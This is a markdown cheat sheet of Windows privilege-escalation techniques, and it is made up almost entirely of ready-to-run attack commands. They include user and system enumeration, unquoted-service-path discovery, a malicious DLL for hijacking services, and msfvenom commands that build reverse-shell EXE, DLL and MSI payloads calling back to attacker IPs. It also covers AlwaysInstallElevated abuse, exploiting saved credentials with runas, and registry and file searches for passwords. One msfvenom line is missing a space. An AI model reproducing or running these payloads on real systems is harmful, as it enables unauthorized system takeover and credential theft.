**`Information Gathering`**
- User enumeration




|cmd|description|
|-------|------|
|whoami /priv|Current user’s privileges|
|net users|List Users|
|net user Administrator|list user info|
|qwinsta / query session|Other users logged in simultaneously|
|net localgroup|User groups defined on the system|
|net localgroup Administrators|List members of a specific group|


- System Info

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`


- Searching Files
`findstr /si password *.txt`

- Check patch

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

- Network info

`netstat -ano`

- scheduled tasks

`schtasks /query /fo LIST /v`

- Drivers

`driverquery`

- AntiVirus

`sc query windefend`
`sc queryex type=service`


- List Vulnerable SoftWare

`wmic product get name,version,vendor`
`wmic service list brief`
`wmic service list brief | findstr  "Running"`

- List services info

`sc qc [servicename]`

```bat
sc qc VMnetDHCP
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VMnetDHCP
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\SysWOW64\vmnetdhcp.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VMware DHCP Service
        DEPENDENCIES       : VMnetuserif
        SERVICE_START_NAME : LocalSystem

```

- unquoted  service path

```bat
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```


```bash
C:\Users\user>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
Fitbit Connect Service                                                              Fitbit Connect                            C:\Program Files (x86)\Fitbit Connect\FitbitConnectService.exe                     Auto
RemoteMouseService                                                                  RemoteMouseService                        C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe                         Auto
Brother BRAgent                                                                     WBA_Agent_Client                          C:\Program Files (x86)\Brother\BRAgent\BRAgtSrv.exe                                Auto


```
*Using Metasploit*

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.172.138   LPORT=4444 -f exe -o  Common.exe
```




- DLL Hijacking

```c
#include <windows.h> 
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) 
{
if (dwReason == DLL_PROCESS_ATTACH) 
{
	system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
	
	 ExitProcess(0); 
										
} 
	return TRUE; 
}
```

```bash
x86_64-w64-mingw32-gcc win.c -shared -o hijackme.dll
```

restart services

```bash
sc stop dllsvc & sc start dllsvc
```

*DLL hijacking using metasploit*

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.172.138 LPORT=4444 -f dll -o  hijackme.dll

```



- Token Impersonation

`Juciy potato`

- AlwaysInstallElevated


```text
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```


*create payload*

```bash

msfvenom -p windows/x64/shell_reverse_tcpLHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
```

*run payload*
```text
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```


- Saved Password

*list saved password*
`cmdkey /list`

*exploit saved password*

`runas /savecred /user:admin evil.exe`


- Registry Keys

Registry keys potentially containing passwords

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


- Unattend Files

`Unattend.xml files helps system administrators setting up Windows systems`







**Resource**
- [PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [sagishahar/lpeworkshop: Windows / Linux Local Privilege Escalation Workshop (github.com)](https://github.com/sagishahar/lpeworkshop)
- [DLL Hijacking - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking)
